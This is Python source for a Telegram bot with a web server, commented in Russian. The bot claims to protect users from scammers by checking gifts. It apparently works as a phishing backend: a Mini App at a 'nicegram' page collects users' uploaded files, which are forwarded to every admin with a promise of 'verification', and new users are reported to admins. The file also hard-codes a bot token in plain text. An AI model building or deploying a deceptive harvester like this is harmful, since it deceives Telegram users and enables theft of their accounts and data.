import asyncio
import logging
import os
import sqlite3
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile

# --- КОНФИГУРАЦИЯ ---
BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'

# ID главных админов (добавляются автоматически при старте)
# Можно указать несколько через запятую
ROOT_ADMINS = [8187498719, 8396015606]

WEB_APP_URL = "https://kareli123.github.io/nicegram/" 

# --- НАСТРОЙКИ СЕРВЕРА ---
WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- БАЗА ДАННЫХ (SQLite) ---
DB_FILE = "bot_data.db"

def init_db():
    """Создает таблицы и добавляет главных админов"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        
        # 1. Таблица всех пользователей (для поиска по username)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT
            )
        ''')
        
        # 2. Таблица администраторов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS admins (
                user_id INTEGER PRIMARY KEY
            )
        ''')
        
        # Добавляем ROOT админов сразу
        for admin_id in ROOT_ADMINS:
            cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
        
        conn.commit()

def add_user_if_new(user: types.User):
    """Сохраняет пользователя в базу для истории и поиска"""
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
            if cursor.fetchone():
                return False 
            
            cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
                           (user.id, user.username, user.full_name))
            conn.commit()
            return True
    except Exception as e:
        logging.error(f"DB Error: {e}")
        return False

def get_all_admins():
    """Возвращает список ID всех админов"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        return [row[0] for row in cursor.fetchall()]

def add_new_admin(user_id):
    """Добавляет нового админа в базу"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        conn.commit()

# --- ВЕБ-СЕРВЕР ---
routes = web.RouteTableDef()

@routes.get('/')
async def keep_alive(request):
    return web.Response(text="Bot is running!")

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    reader = await request.multipart()
    
    user_id = None
    file_data = None
    filename = "unknown.json"

    while True:
        part = await reader.next()
        if part is None: break
        
        if part.name == 'user_id':
            val = await part.read_chunk()
            user_id = val.decode('utf-8')
        elif part.name == 'file':
            filename = part.filename or "data.json"
            file_data = await part.read()

    if user_id and file_data:
        try:
            # Получаем список всех админов
            admin_ids = get_all_admins()
            caption_text = f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
            
            # Рассылаем файл ВСЕМ админам
            for admin_id in admin_ids:
                try:
                    await bot.send_document(
                        chat_id=admin_id,
                        document=BufferedInputFile(file_data, filename=filename),
                        caption=caption_text
                    )
                except Exception as e:
                    logging.warning(f"Не удалось отправить файл админу {admin_id}: {e}")

            # Ответ пользователю
            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл принят. Ожидайте проверки.")
            except:
                pass

        except Exception as e:
            logging.error(f"Ошибка обработки: {e}")
            return web.Response(text="Error", status=500)

    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
    })

@routes.options('/upload')
async def handle_options(request):
    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# --- БОТ ---

TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников. 
Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги."""

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))]
    ])

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    user = message.from_user
    is_new = add_user_if_new(user)
    
    if is_new:
        admin_text = (
            f"👤 <b>Новый пользователь!</b>\n"
            f"Имя: {user.full_name}\n"
            f"Username: @{user.username}\n"
            f"ID: <code>{user.id}</code>"
        )
        # Уведомляем ВСЕХ админов
        admin_ids = get_all_admins()
        for admin_id in admin_ids:
            try:
                await bot.send_message(admin_id, admin_text, parse_mode="HTML")
            except:
                pass

    if os.path.exists("nicegramm.jpg"):
        try:
            photo = FSInputFile("nicegramm.jpg")
            await message.answer_photo(photo=photo, caption=TEXT_MAIN, reply_markup=get_main_keyboard())
        except:
            await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
    else:
        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())

# --- КОМАНДА ВЫДАЧИ АДМИНКИ ---
@router.message(Command("admin"))
async def cmd_add_admin(message: types.Message):
    # 1. Проверяем, является ли отправитель админом
    current_admins = get_all_admins()
    if message.from_user.id not in current_admins:
        return # Игнорируем обычных юзеров

    # 2. Разбираем команду
    args = message.text.split()
    if len(args) < 2:
        await message.answer("⚠️ Чтобы выдать админку, напишите:\n<code>/admin @username</code>", parse_mode="HTML")
        return

    target_username = args[1].replace('@', '').lower()

    # 3. Ищем ID пользователя в базе
    new_admin_id = None
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, full_name FROM users WHERE LOWER(username) = ?", (target_username,))
        result = cursor.fetchone()
        if result:
            new_admin_id = result[0]
            name = result[1]
    
    if not new_admin_id:
        await message.answer("❌ Пользователь не найден. Он должен сначала запустить бота (/start).")
        return

    # 4. Добавляем в таблицу админов
    add_new_admin(new_admin_id)
    
    await message.answer(f"✅ Пользователь <b>{name}</b> добавлен в администраторы!\nТеперь он тоже будет получать файлы.", parse_mode="HTML")
    
    try:
        await bot.send_message(new_admin_id, "👑 <b>Вам выданы права администратора!</b>\nТеперь вы будете получать файлы пользователей.", parse_mode="HTML")
    except:
        pass

# --- ЗАПУСК ---
async def main():
    init_db() # Создаем таблицы и добавляем ROOT админов
    
    app = web.Application()
    app.add_routes(routes)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
    await site.start()
    logging.info(f"🌍 Server running on {WEB_SERVER_HOST}:{WEB_SERVER_PORT}")

    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped!")
